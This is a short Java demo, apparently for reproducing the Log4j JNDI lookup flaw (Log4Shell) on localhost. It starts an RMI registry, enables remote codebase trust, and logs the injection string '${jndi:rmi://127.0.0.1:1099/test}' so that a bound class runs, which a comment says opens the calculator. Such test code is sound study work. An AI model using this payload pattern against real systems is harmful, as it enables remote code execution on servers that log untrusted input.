package com.jz.demo.rmi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import javax.naming.InitialContext;
import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RmiTest {

    private static final Logger logger = LoggerFactory.getLogger(RmiTest.class);

    public static void main(String[] args) throws Exception {
        // 设置系统环境变量进行紧急修复
        //        System.setProperty("FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS", "True");

        // 开启监听 1099 端口，注册调用calc触发打开计算器
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        Registry registry = LocateRegistry.createRegistry(1099);
        Reference reference = new Reference("com.jz.demo.rmi.TestCommand",
            "com.jz.demo.rmi.TestCommand", null);
        ReferenceWrapper refObjWrapper = new ReferenceWrapper(reference);
        registry.bind("test", refObjWrapper);
        System.out.println("即将执行");
//        InitialContext context = new InitialContext();
//        context.lookup("rmi://127.0.0.1:1099/test");
        // 这种方式执行将触发上面的 calc 类执行
        logger.error("执行：{}", "${jndi:rmi://127.0.0.1:1099/test}");
    }

}
